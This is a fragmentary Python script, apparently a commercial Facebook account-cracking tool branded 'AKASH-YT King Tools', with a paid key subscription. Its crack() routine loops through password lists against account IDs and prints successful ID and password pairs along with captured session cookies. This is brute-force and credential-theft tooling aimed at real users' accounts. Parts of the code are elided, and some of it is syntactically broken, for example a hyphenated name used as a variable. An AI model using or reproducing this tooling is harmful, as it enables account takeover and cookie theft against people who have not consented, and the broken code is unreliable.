...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mAKASH-YT')
...
os.system('espeak -a 300 " Welcome,   to,  AKASH-YT,  King,  Tools"')
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-AKASH-YT ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Md Akash islam ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mAKASH-YT-King ]   ║\33[1;34m   
...
def login():
	banner()
	AKASH-YTj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	AKASH-YTj('\033[0;97m===============================================')
	AKASH-YT= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if AKASH-YT in ['m']:
		public()
	elif AKASH-YT in ['1']:
		crack_file()
	elif AKASH-YT in ['i','0i']:
		result()
	elif AKASH-YT in ['2','02']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[AKASH-YT-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#AKASH-YT-King
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•AKASH-YT-Cp] {idf} • {pw}')     
				...
				#AKASH-YT-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•AKASH-YT-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " AKASH-YT,  Ok,  id"')
...
def Subscraption():
	...
	if key1 in r1:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m AKASH-YT King, ToOLs Daily Update")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+AKASH-YT+key1)
		...
		time.sleep(3.5)
		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+AKASH-YT+''+key1
